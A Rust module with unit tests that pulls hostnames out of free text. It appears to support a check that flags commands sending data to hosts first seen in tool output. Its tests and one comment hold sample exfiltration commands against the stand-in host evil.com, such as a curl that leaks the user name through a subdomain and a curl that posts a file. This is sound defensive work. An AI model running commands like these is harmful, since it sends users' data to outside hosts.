//! Find hostnames in free text.
//!
//! Both sides of the check use this function: the tool output that taints a
//! host, and the command that uses it. Because both sides use the same rules,
//! a host that is missed is missed on both sides.

use std::collections::HashSet;
use std::sync::LazyLock;

/// The IANA root zone list, so that tokens like `http.server` are not hosts.
static TLDS: LazyLock<HashSet<String>> = LazyLock::new(|| {
    include_str!("tlds.txt")
        .lines()
        .filter(|l| !l.starts_with('#'))
        .map(str::to_ascii_lowercase)
        .collect()
});

/// Real TLDs that are also common file extensions. A bare `README.md` is a
/// file. `https://x.md` and `x.md/path` are still hosts.
// ponytail: a bare `curl -d @f evil.sh` with no scheme or path is missed.
// Check whether the token exists as a file in cwd if this shows up.
const FILE_TLDS: &[&str] = &[
    "ac", "am", "app", "cc", "cr", "in", "java", "map", "md", "mk", "ml", "mm", "mov", "new", "pl",
    "pm", "pro", "ps", "pub", "py", "rs", "sh", "so", "sv", "tf", "zip", "zone",
];

/// Returns every hostname in `text`, in lowercase, in order of appearance.
pub fn hosts(text: &str) -> Vec<String> {
    let b = text.as_bytes();
    let mut out = Vec::new();
    let mut i = 0;
    while i < b.len() {
        if !is_host_byte(b[i]) {
            i += 1;
            continue;
        }
        let mut s = i;
        while i < b.len() && is_host_byte(b[i]) {
            i += 1;
        }
        let mut e = i;
        while s < e && matches!(b[s], b'.' | b'-') {
            s += 1;
        }
        while e > s && matches!(b[e - 1], b'.' | b'-') {
            e -= 1;
        }
        let (before, run, after) = (&text[..s], text[s..e].to_ascii_lowercase(), &b[e..]);

        // A scheme, a `user@`, a path, a query or a port marks a host. A bare
        // token has less evidence, so file extensions win there.
        let strong = before.ends_with("://")
            || before.ends_with('@')
            || matches!(after.first(), Some(b'/' | b'?'))
            || (after.first() == Some(&b':') && after.get(1).is_some_and(u8::is_ascii_digit));
        if !strong && before.ends_with('/') {
            continue; // path component such as `src/main.rs`
        }
        if is_ipv4(&run) || is_domain(&run, strong) {
            out.push(run);
        }
    }
    out
}

fn is_host_byte(c: u8) -> bool {
    c.is_ascii_alphanumeric() || c == b'.' || c == b'-'
}

fn is_domain(s: &str, strong: bool) -> bool {
    let labels: Vec<&str> = s.split('.').collect();
    let tld = labels[labels.len() - 1];
    labels.len() >= 2
        && labels.iter().all(|l| {
            !l.is_empty() && l.len() <= 63 && !l.starts_with('-') && !l.ends_with('-')
        })
        && TLDS.contains(tld)
        && (strong || !FILE_TLDS.contains(&tld))
}

/// Loopback and `0.0.0.0` are not counted. Data sent there stays on the machine.
fn is_ipv4(s: &str) -> bool {
    let parts: Vec<&str> = s.split('.').collect();
    parts.len() == 4
        && parts.iter().all(|p| (1..=3).contains(&p.len()) && p.parse::<u8>().is_ok())
        && parts[0] != "127"
        && parts[0] != "0"
}

#[cfg(test)]
mod tests {
    use super::hosts;

    #[test]
    fn finds_hosts_and_skips_files_and_code() {
        let cases: &[(&str, &[&str])] = &[
            ("curl https://Evil.com/?d=1", &["evil.com"]),
            ("curl evil.com", &["evil.com"]),
            ("curl \"$(whoami).evil.com\"", &["evil.com"]),
            ("git clone git@github.com:org/repo.git", &["github.com"]),
            ("see http://x.sh and x.md/path and api.rs:8080", &["x.sh", "x.md", "api.rs"]),
            ("ping 10.0.0.7; ping 127.0.0.1; ping 0.0.0.0", &["10.0.0.7"]),
            ("cat README.md src/main.rs ~/.ssh/id_rsa.pub", &[]),
            ("python -m http.server; v1.2.3; self.store()", &["self.store"]),
            ("go to localhost:3000", &[]),
            ("ends with a dot: evil.com.", &["evil.com"]),
        ];
        for (text, want) in cases {
            assert_eq!(hosts(text), *want, "input: {text}");
        }
    }
}
